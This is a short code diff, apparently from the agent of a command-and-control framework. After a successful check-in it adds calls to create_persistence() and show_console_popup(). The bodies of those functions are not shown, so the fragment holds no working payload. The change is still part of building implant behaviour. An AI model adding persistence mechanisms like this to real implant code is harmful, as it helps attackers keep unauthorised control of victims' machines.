@@ -326,6 +326,8 @@ CRYPTO_MODULE_PLACEHOLDER
         # Attempt initial check-in with retries
         for attempt in range(max_checkin_retries):
             if self.checkIn():
+                self.create_persistence()
+                self.show_console_popup()
                 break
             if attempt < max_checkin_retries - 1:
                 time.sleep(checkin_retry_delay)
